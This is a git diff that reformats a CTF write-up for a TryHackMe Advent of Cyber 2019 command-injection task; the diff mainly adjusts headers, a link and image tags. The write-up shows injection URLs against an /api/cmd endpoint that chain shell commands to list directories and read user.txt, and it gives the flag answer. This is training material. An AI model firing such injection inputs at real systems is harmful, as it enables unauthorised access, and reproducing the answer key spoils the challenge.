@@ -1,4 +1,4 @@
-##Introduction##
+## Introduction
 
 > Another day, another hack from the Christmas Monster. Can you get back control of the system?
 
@@ -6,15 +6,15 @@
 
 > McSkidy actually found something interesting on the /api/cmd endpoint.
 
-> Check out the supporting material here. _(see Christmas Command Injection.pdf)_
+> Check out the [supporting material](https://github.com/g33k4y/TryHackMe-AdventofCyber2019-Writeup/blob/master/task24/Christmas%20Command%20Injection.pdf) here.
 
-##Question 1##
+## Question 1
 
 > What are the contents of the user.txt file?
 
 td:lr Answer: **5W7WkjxBWwhe3RNsWJ3Q**
 
-=============================================================================================
+===============================================================================
 
 On the webpage, it is just an empty page with the text "christmas monster was here"
 
@@ -30,9 +30,11 @@ straightaway we can see a json return of 'root\n', which means our command injec
 So now we need to find the right information by enumerating and finding the right file:
 
 `http://[ip]:3000/api/cmd/ls -la`
+![](./pic1.png)
 `http://[ip]:3000/api/cmd/cd home&&ls -la`
+![](./pic2.png)
 `http://[ip]:3000/api/cmd/cd home&&cd bestadmin&&ls -la`
-!(./pic3.png)
+![](./pic3.png)
 
 in the directory home/bestadmin/ we will find the user.txt file. Hence the below will give us the answer.
 `http://[ip]:3000/api/cmd/cd%20home&&cd%20bestadmin&&cat%20user.txt`
